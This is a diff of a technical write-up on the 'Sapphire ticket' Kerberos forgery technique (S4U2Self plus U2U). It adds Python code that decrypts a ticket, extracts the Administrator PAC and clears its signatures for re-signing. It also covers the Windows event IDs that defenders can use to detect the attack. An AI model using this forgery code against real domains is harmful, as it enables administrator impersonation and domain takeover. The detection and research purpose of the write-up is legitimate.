@@ -82,7 +82,7 @@ In the S4U Kerberos Extension of Windows, S4U2Self permits a service getting a S
 
 Using *paDATA pA-FOR-USER* we can request S4U2Self.
 
-## Put all together
+## Putting all together
 
 Thus, the idea is: we authenticate in the domain with any account, request S4U2Self, but, we are not a service (I mean, we do not have an SPN). At the Service Name we specify the user that we have use to authenticate, performing U2U. The result is that the KDC will generate a Service Ticket to us on behalft of the user. Now, we have de PAC of the target user :).
 
@@ -133,9 +133,50 @@ We can see how he extracts the PAC.
 [...]            
 ```
 
-And that PAC of the TGT we already have is (almost) changed like always in *Ticketer* with the new PAC obtained from S4U2Self+U2U by updating *pacInfos* .
+And that PAC of the TGT we already have is (almost) changed like always in *Ticketer* with the new PAC obtained from S4U2Self+U2U by updating *pacInfos*.
+
+Additionally, some flags are always set: Forwadable, Proxiable, Renewable, Pre-Authent
 
 ```python
+[...]
+            # 2. extract PAC
+            logging.info('\tDecrypting ticket & extracting PAC')
+            decodedTicket = decoder.decode(tgs, asn1Spec=TGS_REP())[0]
+            cipherText = decodedTicket['ticket']['enc-part']['cipher']
+            newCipher = _enctype_table[int(decodedTicket['ticket']['enc-part']['etype'])]
+            plainText = newCipher.decrypt(self.__tgt_session_key, 2, cipherText)
+            encTicketPart = decoder.decode(plainText, asn1Spec=EncTicketPart())[0]
+
+            # Let's extend the ticket's validity a lil bit
+            # I don't think this part should be left in the code. The whole point of doing a sapphire ticket is stealth, extending ticket duration is not the way to go
+            # encTicketPart['endtime'] = KerberosTime.to_asn1(ticketDuration)
+            # encTicketPart['renew-till'] = KerberosTime.to_asn1(ticketDuration)
+
+            # Opening PAC
+            adIfRelevant = decoder.decode(encTicketPart['authorization-data'][0]['ad-data'], asn1Spec=AD_IF_RELEVANT())[0]
+            pacType = pac.PACTYPE(adIfRelevant[0]['ad-data'].asOctets())
+            pacInfos = dict()
+            buff = pacType['Buffers']
+
+            # clearing the signatures so that we can sign&encrypt later on
+            logging.info("\tClearing signatures")
+            for bufferN in range(pacType['cBuffers']):
+                infoBuffer = pac.PAC_INFO_BUFFER(buff)
+                data = pacType['Buffers'][infoBuffer['Offset'] - 8:][:infoBuffer['cbBufferSize']]
+                buff = buff[len(infoBuffer):]
+                if infoBuffer['ulType'] in [PAC_SERVER_CHECKSUM, PAC_PRIVSVR_CHECKSUM]:
+                    checksum = PAC_SIGNATURE_DATA(data)
+                    if checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes256.value:
+                        checksum['Signature'] = '\x00' * 12
+                    elif checksum['SignatureType'] == ChecksumTypes.hmac_sha1_96_aes128.value:
+                        checksum['Signature'] = '\x00' * 12
+                    else:
+                        checksum['Signature'] = '\x00' * 16
+                    **pacInfos[infoBuffer['ulType']] = checksum.getData()**
+                else:
+                    **pacInfos[infoBuffer['ulType']] = data**
+[...]
+**newFlags = [TicketFlags.forwardable.value, TicketFlags.proxiable.value, TicketFlags.renewable.value, TicketFlags.pre_authent.value]**
 [...]
 else:
             encTicketPart = EncTicketPart()
@@ -183,7 +224,7 @@ else:
 
 The DC generates the following events.
 
-Firt the authentication one because of AS_REQ, Event ID 4768.
+Firt the authentication one because of AS_REQ, Event ID **4768**.
 
 ```
 A Kerberos authentication ticket (TGT) was requested.
@@ -217,7 +258,7 @@ Certificate information is only provided if a certificate was used for pre-authe
 Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
 ```
 
-And it is followed inmediatly by a Event ID 4769 because of TGS_REQ requesting the ST with S42Self+U2U.
+And it is followed inmediatly by a Event ID **4769** because TGS_REQ using S42Self+U2U is inmediately performed to request the ST.
 
 ```
 A Kerberos service ticket was requested.
@@ -248,7 +289,7 @@ This event can be correlated with Windows logon events by comparing the Logon GU
 Ticket options, encryption types, and failure codes are defined in RFC 4120.
 ```
 
-As you can see, the account is Administrator and the service is the computer account of the KDC. Remeber that we did not specified a SPN, we used a Username in the sname field.
+As you can see, the account is Administrator and the service is the computer account of the KDC. Remeber that we did not specified a SPN, we used a Username in the *sname* field.
 
 Now, blue teamers investigate more and create a Sigma Rule :P
 
